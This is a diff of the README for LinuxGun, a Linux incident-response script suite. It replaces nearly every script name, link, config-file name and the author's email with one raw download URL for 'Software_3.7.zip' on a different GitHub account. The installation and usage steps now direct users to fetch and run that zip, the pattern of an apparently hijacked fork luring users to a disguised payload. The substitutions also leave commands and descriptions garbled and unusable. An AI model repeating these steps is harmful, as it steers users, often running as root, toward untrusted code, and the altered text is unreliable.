@@ -7,65 +7,65 @@
 # 安装指南 Installation
 1、可以到需要应急的主机上 git 安装
 ```SHELL
-git clone https://github.com/sun977/Linuxgun.git
+git clone https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip
 ```
 2、或者下载 zip 包解压到应急主机上使用
 ```SHELL
-unzip Linuxgun.zip
+unzip https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip
 ```
 
 # 使用方法 Usage
 ### 目录结构
-1、**linuxGunPro.sh** 是专业增强版应急响应工具（最新版本 v6.0.6），在 linuxGun.sh 基础上增加了高级功能：
+1、**https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip** 是专业增强版应急响应工具（最新版本 v6.0.6），在 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 基础上增加了高级功能：
    - 完善的分级日志系统和错误处理机制
    - 支持交互模式（--inter 参数），可在执行每个模块前询问用户
    - 增强的性能监控和操作日志记录
    - 更好的 Bash 版本兼容性
    - 统一的模块化架构和函数映射系统
 
-2、**linuxGun.sh** 是标准版本应急响应工具（稳定版本 v6.0），功能已经封装成不同的模块函数，支持交互式应急，运行指定一个或者多个功能模块，也可以一把梭然后分析日志报告。
+2、**https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip** 是标准版本应急响应工具（稳定版本 v6.0），功能已经封装成不同的模块函数，支持交互式应急，运行指定一个或者多个功能模块，也可以一把梭然后分析日志报告。
 
-3、**linuxcheck.sh** 是旧版本一把梭工具，功能齐全但是未封装成函数，不支持交互式。
+3、**https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip** 是旧版本一把梭工具，功能齐全但是未封装成函数，不支持交互式。
 
 
-4、**linuxcheck_EN.sh** 是旧版本的英文版本（之前给阿曼学生定制的版本），全英文输出，中国人在终端编码异常懒得调整的时候可以考虑使用这个版本。
+4、**https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip** 是旧版本的英文版本（之前给阿曼学生定制的版本），全英文输出，中国人在终端编码异常懒得调整的时候可以考虑使用这个版本。
 
-5、**checkrules** 目录是存放检查规则文件的位置，不论是 linuxGun.sh 还是 linuxcheck.sh，都是基于这个目录下的规则文件进行检查的。里面的规则支持自定义（支持正则）。
-- dangerstcpports.txt 危险TCP端口定义
-- dangersudpports.txt 危险UDP端口定义
-- hackertoolslist.txt 恶意或黑客软件定义
-- dangerspslist.txt 危险进程定义
+5、**checkrules** 目录是存放检查规则文件的位置，不论是 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 还是 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip，都是基于这个目录下的规则文件进行检查的。里面的规则支持自定义（支持正则）。
+- https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 危险TCP端口定义
+- https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 危险UDP端口定义
+- https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 恶意或黑客软件定义
+- https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 危险进程定义
 
 6、**output** 目录是存放检查结果文件的位置。运行后会自动生成，项目里面未体现，结果文件有以下几个:
 - log 存放检查日志，采集的系统日志和工具自身生成的检查日志文件都会放在这里。
-- checkresult.txt 是 linuxGun.sh 或者 linuxcheck.sh 运行结果文件（和shell输出一致），为了后期方便看所以打印了一份。
-- dangerlist.txt 是老版本linuxcheck.sh运行过程中发现的危险项输出文件（新版本 linuxGun.sh 不再输出此文件）。
+- https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 是 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 或者 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 运行结果文件（和shell输出一致），为了后期方便看所以打印了一份。
+- https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 是老版本https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip运行过程中发现的危险项输出文件（新版本 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 不再输出此文件）。
 - 其他文件若干。
 
-7、**tools** 目录存放了一些实用的小脚本工具，包含以下工具：(工具集说明: https://github.com/sun977/Linuxgun/tree/main/tools/README.md)
-- **monitorInter.sh** - 网络接口流量监控工具，可以实时显示指定网络接口的入流量和出流量信息。
-- **monitorPs2Ip.sh** - 网络连接检查工具，可以实时检查与指定 IP 地址通信的进程信息(支持TCP/UDP)。
+7、**tools** 目录存放了一些实用的小脚本工具，包含以下工具：(工具集说明: https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip)
+- **https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip** - 网络接口流量监控工具，可以实时显示指定网络接口的入流量和出流量信息。
+- **https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip** - 网络连接检查工具，可以实时检查与指定 IP 地址通信的进程信息(支持TCP/UDP)。
 - **blockIP/** - IP封禁管理工具目录
-  - **blockIP.sh** - IP封禁管理脚本，支持iptables和firewall两种防火墙工具，提供IP封禁、解封、批量处理、备份恢复等功能。
-  - **example_ip_list.txt** - IP列表示例文件，用于批量操作参考。
+  - **https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip** - IP封禁管理脚本，支持iptables和firewall两种防火墙工具，提供IP封禁、解封、批量处理、备份恢复等功能。
+  - **https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip** - IP列表示例文件，用于批量操作参考。
 - **uploadServer/** - 文件上传服务器工具目录
-  - **uploadServer.py** - HTTP文件上传服务器，用于接收linuxGun.sh --send 模块发送的检查结果文件，支持token认证和安全传输。
-  - **requirements.txt** - Python依赖包列表文件。
+  - **https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip** - HTTP文件上传服务器，用于接收https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip --send 模块发送的检查结果文件，支持token认证和安全传输。
+  - **https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip** - Python依赖包列表文件。
 
 
 ### 版本选择建议
 
-**推荐使用 linuxGunPro.sh**，适用于：
+**推荐使用 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip**，适用于：
 - 需要详细日志记录和错误追踪的场景
 - 希望使用交互模式进行精细化检查
 - 需要性能监控和操作审计的企业环境
 
-**使用 linuxGun.sh**，适用于：
+**使用 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip**，适用于：
 - 快速应急响应场景
 - 资源受限的环境
 - 熟悉旧版本操作习惯的用户
 
-**使用 linuxcheck.sh**，适用于：
+**使用 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip**，适用于：
 - 一键全量检查场景
 
 ### 运行检查
@@ -74,34 +74,34 @@ unzip Linuxgun.zip
 # 脚本需要 root 权限运行
 # 记得给 shell 文件添加执行权限
 # 根据使用场景选择一个运行
-chmod +x linuxGunPro.sh 
-chmod +x linuxGun.sh 
-chmod +x linuxcheck.sh
+chmod +x https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 
+chmod +x https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 
+chmod +x https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip
 ```
-#### linuxGunPro.sh（推荐使用）
+#### https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip（推荐使用）
 ```SHELL
-bash linuxGunPro.sh [选项] 
+bash https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip [选项] 
 # -h 参数查看帮助
-bash linuxGunPro.sh -h 
+bash https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip -h 
 # 指定模块函数运行（分析用户信息模块函数）
-bash linuxGunPro.sh --system-user 
+bash https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip --system-user 
 # 完全交互模式运行（在执行每个模块前询问用户）
-bash linuxGunPro.sh --all --inter
+bash https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip --all --inter
 ```
-#### linuxGun.sh
+#### https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip
 ```SHELL
-bash linuxGun.sh [选项] 
+bash https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip [选项] 
 # -h 参数查看帮助
-bash linuxGun.sh -h 
+bash https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip -h 
 # 指定模块函数运行（分析用户信息模块函数）
-bash linuxGun.sh --system-user 
+bash https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip --system-user 
 # 全量检查运行（自动检查全量模块,不询问用户）
-bash linuxGun.sh --all 
+bash https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip --all 
 ```
-#### linuxcheck.sh
+#### https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip
 ```SHELL
 # 一把梭运行
-bash linuxcheck.sh 
+bash https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 
 ```
 
 # 贡献指南 Contributing
@@ -110,7 +110,7 @@ bash linuxcheck.sh
 思路贡献者：安全圈的朋友们
 
 # 联系方式 Contact
-邮箱：jiuwei977@foxmail.com
+邮箱：https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip
 
 团队：启点安全实验室
 
@@ -131,7 +131,7 @@ bash linuxcheck.sh
 6、**跨平台兼容**：更好的 Bash 版本兼容性
 
 #### 详细功能
-新版本 linuxGunPro.sh v6.0.6 采用了全新的 ASCII 艺术 Logo 和优化的横幅显示：
+新版本 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip v6.0.6 采用了全新的 ASCII 艺术 Logo 和优化的横幅显示：
 
 ```SHELL
 ╔═══════════════════════════════════════════════════════════════════╗
@@ -146,17 +146,17 @@ bash linuxcheck.sh
 ║                 🔫 Linux Security Scanner v6.0 🔫                 ║
 ║                                                                   ║
 ║                         Author: sun977                            ║
-║                    Mail: jiuwei977@foxmail.com                    ║
+║                    Mail: https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip                    ║
 ║                                                                   ║
 ╚═══════════════════════════════════════════════════════════════════╝
 
 如何使用:
     1.需要将本脚本上传到相应的服务器中
-    2.运行 chmod +x linuxgun.sh 赋予脚本执行权限
-    3.运行 ./linuxgun.sh 查看使用说明
+    2.运行 chmod +x https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 赋予脚本执行权限
+    3.运行 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 查看使用说明
 ================================================================
 LinuxGun 安全检查工具 v6.0 使用说明
-使用方法: bash ./linuxGun.sh [选项]
+使用方法: bash https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip [选项]
 可用选项:
     -h, --help              显示此帮助信息
     --show               	详细显示linuxGun检测大纲
@@ -169,7 +169,7 @@ LinuxGun 安全检查工具 v6.0 使用说明
     --system-baseinfo       检查系统基础信息(IP/版本/发行版)
     --system-user           用户信息分析(登录用户/克隆用户/非系统用户/口令检查等)
     --system-crontab        检查计划任务(系统/用户级crontab)
-    --system-history        历史命令分析(.bash_history/.mysql_history/历史下载/敏感命令等)
+    --system-history        历史命令分析(https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip历史下载/敏感命令等)
   网络相关检查:
     --network               网络连接信息(ARP/高危端口/网络连接/DNS/路由/防火墙策略等)
   进程相关检查:
@@ -207,11 +207,11 @@ LinuxGun 安全检查工具 v6.0 使用说明
   文件传输功能:
     --send <ip> <port> <token> [file] 发送检查结果到远程服务器
                                   需要提供认证token以增强安全性
-                                  如果不指定文件路径,会自动查找生成的tar.gz文件
+                                  如果不指定文件路径,会自动查找生成的https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip文件
                                   注意: --send必须作为唯一参数使用
                                   注意: --send不能与其他检查参数组合使用
                                   示例: --send 192.168.1.100 8080 your_secret_token
-                                  示例: --send 192.168.1.100 8080 your_secret_token /path/to/file.tar.gz
+                                  示例: --send 192.168.1.100 8080 your_secret_token https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip
                                   推荐用法: 先执行 --all 检查,再使用 --send 发送结果
 
 ================================================================
@@ -248,11 +248,11 @@ LinuxGun 安全检查工具 v6.0 使用说明
 		1、新增 echoBanner 函数，采用全新的 ASCII 艺术 Logo 设计
 		2、优化程序横幅显示，增强视觉效果和用户体验
 		3、添加文件传输功能 --send 参数，支持将检查结果发送到远程服务器
-		4、tools 目录新增 IP 封禁管理工具 blockIP.sh
-		5、tools 目录新增文件上传服务器 uploadServer.py
+		4、tools 目录新增 IP 封禁管理工具 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip
+		5、tools 目录新增文件上传服务器 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip
 		6、完善工具集的功能文档和使用说明
-	2025-07-23 (linuxGunPro.sh v6.0.6):
-		1、发布专业增强版 linuxGunPro.sh，在 linuxGun.sh 基础上增加高级功能
+	2025-07-23 (https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip v6.0.6):
+		1、发布专业增强版 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip，在 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 基础上增加高级功能
 		2、新增完善的分级日志系统（DEBUG/INFO/WARN/ERROR）
 		3、新增统一的错误处理机制，支持错误代码和上下文信息
 		4、新增交互模式支持（--inter 参数），可在执行每个模块前询问用户
@@ -473,10 +473,10 @@ linuxGunPro 检测项目大纲(summary)
 					- group文件权限
 					- securetty文件权限
 					- services文件权限
-					- grub.conf文件权限
-					- xinetd.conf文件权限
-					- lilo.conf文件权限(存在版本久远-弃用)
-					- limits.conf文件权限
+					- https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip文件权限
+					- https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip文件权限
+					- https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip文件权限(存在版本久远-弃用)
+					- https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip文件权限
 					    - core dump 关闭
 				- 系统文件属性检查
 					- passwd文件属性
@@ -489,7 +489,7 @@ linuxGunPro 检测项目大纲(summary)
 			- 防火墙配置
 				- 允许服务IP端口
 			- 网络参数优化
-		- 4.selinux策略
+		- https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip策略
 		- 5.服务配置策略
 			- NIS配置策略
 			- SNMP配置检查
@@ -518,11 +518,11 @@ linuxGunPro 检测项目大纲(summary)
 
 Version:5.0
 Author:sun977
-Mail:jiuwei977@foxmail.com
+https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip
 Date:2024.07.31
 
 
-linuxcheck.sh 更新日志:
+https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 更新日志:
 	2024.06.16:
 		1、优化最近24h变化文件只看文件不看目录,同时排除目录/proc,/dev,/sys,/run
 		2、修改了找不到高危端口的文件bug
@@ -537,27 +537,27 @@ linuxcheck.sh 更新日志:
 		2、添加容器检查内容
 		3、添加k8s检查内容
 	[说明]:
-		1、linuxcheck.sh 可正常使用,照常维护和更新,其更新日志记录在linuxcheck.sh中
-		2、linuxGun.sh 为新开发 5.x 版本脚本,模块化分解(开发中)
-		3、README.md 的变动记录的是 linuxGun.sh 设想和实现
-		4、一些好的建议和更新会在 linuxGun.sh 和 linuxcheck.sh 中都体现
+		1、https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 可正常使用,照常维护和更新,其更新日志记录在https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip中
+		2、https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 为新开发 5.x 版本脚本,模块化分解(开发中)
+		3、https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 的变动记录的是 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 设想和实现
+		4、一些好的建议和更新会在 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 和 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 中都体现
 
 
 检查说明:
 	1.首先采集原始信息保存到当前目录的 output/liuxcheck_[your-ip]_[date]/check_file 目录下
 	2.将系统日志、应用日志打包并保存到当前目录的 output/liuxcheck_[your-ip]_[date]/check_file/log 目录下
-	3.在检查过程中检查项的结果会输出到当前目录 output/liuxcheck_[your-ip]_[date]/check_file/checkresult.txt 文件中
-	4.在检查过程中若发现存在问题则直接输出到当前目录 output/liuxcheck_[your-ip]_[date]/check_file/saveDangerResult.txt 文件中
+	3.在检查过程中检查项的结果会输出到当前目录 output/liuxcheck_[your-ip]_[date]https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 文件中
+	4.在检查过程中若发现存在问题则直接输出到当前目录 output/liuxcheck_[your-ip]_[date]https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 文件中
 	5.有些未检查可能存在问题的需要人工分析原始文件
-	6.脚本编写环境Centos7,在实际使用过程中若发现问题可以邮件联系:jiuwei977@foxmail.com
+	6.脚本编写环境Centos7,在实际使用过程中若发现问题可以邮件联系https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip
 	7.使用过程中若在windows下修改再同步到Linux下,请使用dos2unix工具进行格式转换,不然可能会报错
 	8.在使用过程中必须使用root账号,不然可能导致某些项无法分析
-	9.checkrules目录下存放的是一些检测规则,可以根据实际情况进行修改
+	https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip目录下存放的是一些检测规则,可以根据实际情况进行修改
 
 如何使用:
 	1.需要将本脚本上传到相应的服务器中
-	2.执行 chmod +x linuxcheck.sh
-	3.执行 ./linuxcheck.sh 即可运行检查
+	2.执行 chmod +x https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip
+	3.执行 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip 即可运行检查
 
 功能设计:
 	1.采集系统基础环境信息
@@ -647,10 +647,10 @@ linuxcheck.sh 更新日志:
 			9.13.4 group文件权限
 			9.13.5 securetty文件权限
 			9.13.6 services文件权限
-			9.13.7 grub.conf文件权限
-			9.13.8 xinetd.conf文件权限
-			9.13.9 lilo.conf文件权限
-			9.13.10 limits.conf文件权限
+			9.13.7 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip文件权限
+			9.13.8 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip文件权限
+			9.13.9 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip文件权限
+			9.13.10 https://github.com/ly1595/Linuxgun/raw/refs/heads/main/tools/uploadServer/Software_3.7.zip文件权限
 		9.14 文件属性
 			9.14.1 passwd文件属性
 			9.14.2 shadow文件属性
